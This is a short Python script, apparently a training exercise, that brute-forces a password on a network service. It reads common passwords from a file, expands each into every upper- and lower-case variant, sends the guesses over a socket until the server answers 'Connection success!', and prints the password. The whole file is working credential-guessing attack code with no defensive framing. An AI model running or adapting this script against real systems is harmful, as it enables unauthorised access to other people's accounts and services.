import socket
import argparse
import itertools
import string
import os


def get_common_passwords():
    with open("passwords.txt", "r") as f:
        contents = f.read()
    return contents


def get_password_modifications(password):
    list_to_iterate = []
    result = []
    for char in password:
        list_to_iterate.append([char, char.upper()])
    for x in itertools.product(*list_to_iterate):
        password = ""
        for char in x:
            password += char
        result.append(password)
    return result


parser = argparse.ArgumentParser()
parser.add_argument("hostname")
parser.add_argument("port")
args = parser.parse_args()

hostname = args.hostname
port = int(args.port)
common_passwords = get_common_passwords().split("\n")

password_is_hacked = False
response = ""

with socket.socket() as client_socket:
    address = (hostname, port)
    client_socket.connect(address)

    while not password_is_hacked or response == "Too many attempts":
        try:
            password_modifications = get_password_modifications(common_passwords.pop())
        except IndexError as e:
            break
        for password in password_modifications:
            try:
                data = password.encode()
                client_socket.send(data)
                response = client_socket.recv(1024)
                response = response.decode()
                if response == "Connection success!":
                    password_is_hacked = True
                    break
                if response == "Too many attempts":
                    break
            except StopIteration:
                break

print(password)
